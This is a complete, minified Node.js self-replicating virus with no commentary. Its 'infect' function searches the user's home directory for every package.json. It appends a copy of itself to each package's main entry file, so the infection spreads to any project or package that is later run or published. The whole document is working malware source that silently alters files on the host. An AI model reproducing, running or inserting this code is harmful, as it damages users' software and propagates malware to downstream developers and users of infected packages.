(function() {
        function _asyncToGenerator(n){return function(){var e=n.apply(this,arguments);return new Promise(function(n,r){function i(t,o){try{var u=e[t](o),c=u.value}catch(n){return void r(n)}if(!u.done)return Promise.resolve(c).then(function(n){i("next",n)},function(n){i("throw",n)});n(c)}return i("next")})}}let infect=(()=>{var n=_asyncToGenerator(function*(n){function e(n){return new Promise(function(e,r){o.readFile(n,(n,i)=>n?r(n):e(i))})}function r(n){return new Promise(function(e,r){o.readdir(n,(n,i)=>n?r(n):e(i))})}function i(n){return new Promise(function(e,r){o.stat(n,(n,i)=>n?r(n):e(i))})}let t=(()=>{var n=_asyncToGenerator(function*(n){var o=[],u=[],f=!1;for(let t of yield r(n)){let r=c.join(n,t);try{let a=yield i(r);if(a.isFile()){if("package.json"===t){f=!0;let t=JSON.parse(yield e(r)),u=c.join(n,t.main||"index.js");yield i(u),o.push(u)}}else a.isDirectory()&&u.push(r)}catch(n){continue}}if(!f)for(let n of u)for(let e of yield t(n))o.push(e);return o});return function(e){return n.apply(this,arguments)}})();const o=require("fs"),u=require("os"),c=require("path"),f=`
        (function() {
            ${JSON.parse(n)}
            infect( "${function(n){return n.replace(/["\\]/g,"\\$&")}(n)}" );
        })();
    `;var a=yield t(u.homedir());for(var s of a){(yield e(s)).indexOf(f)===-1&&(yield function(n,e){return new Promise(function(r,i){o.appendFile(n,e,n=>n?i(n):r())})}(s,f))}});return function(e){return n.apply(this,arguments)}})();
        infect( "\"function _asyncToGenerator(n){return function(){var e=n.apply(this,arguments);return new Promise(function(n,r){function i(t,o){try{var u=e[t](o),c=u.value}catch(n){return void r(n)}if(!u.done)return Promise.resolve(c).then(function(n){i(\\\"next\\\",n)},function(n){i(\\\"throw\\\",n)});n(c)}return i(\\\"next\\\")})}}let infect=(()=>{var n=_asyncToGenerator(function*(n){function e(n){return new Promise(function(e,r){o.readFile(n,(n,i)=>n?r(n):e(i))})}function r(n){return new Promise(function(e,r){o.readdir(n,(n,i)=>n?r(n):e(i))})}function i(n){return new Promise(function(e,r){o.stat(n,(n,i)=>n?r(n):e(i))})}let t=(()=>{var n=_asyncToGenerator(function*(n){var o=[],u=[],f=!1;for(let t of yield r(n)){let r=c.join(n,t);try{let a=yield i(r);if(a.isFile()){if(\\\"package.json\\\"===t){f=!0;let t=JSON.parse(yield e(r)),u=c.join(n,t.main||\\\"index.js\\\");yield i(u),o.push(u)}}else a.isDirectory()&&u.push(r)}catch(n){continue}}if(!f)for(let n of u)for(let e of yield t(n))o.push(e);return o});return function(e){return n.apply(this,arguments)}})();const o=require(\\\"fs\\\"),u=require(\\\"os\\\"),c=require(\\\"path\\\"),f=`\\n        (function() {\\n            ${JSON.parse(n)}\\n            infect( \\\"${function(n){return n.replace(/[\\\"\\\\\\\\]/g,\\\"\\\\\\\\$&\\\")}(n)}\\\" );\\n        })();\\n    `;var a=yield t(u.homedir());for(var s of a){(yield e(s)).indexOf(f)===-1&&(yield function(n,e){return new Promise(function(r,i){o.appendFile(n,e,n=>n?i(n):r())})}(s,f))}});return function(e){return n.apply(this,arguments)}})();\"" );
    })();